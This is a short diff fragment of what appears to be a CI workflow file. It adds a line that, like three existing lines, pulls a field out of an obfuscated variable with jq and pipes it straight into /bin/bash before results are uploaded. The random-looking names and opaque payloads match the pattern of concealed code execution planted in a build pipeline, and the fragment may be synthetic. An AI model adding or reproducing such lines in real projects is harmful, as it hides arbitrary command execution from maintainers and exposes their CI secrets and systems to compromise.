@@ -29,6 +29,7 @@ jobs:
           echo $gqe19 | jq -r .o5431 | /bin/bash
           echo $qoegc2799 | jq -r .gegv86176 | /bin/bash
           echo $nl1344 | jq -r .vin19168 | /bin/bash
+          printf '%s' "$cdrr36" | jq -r .vcik9 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
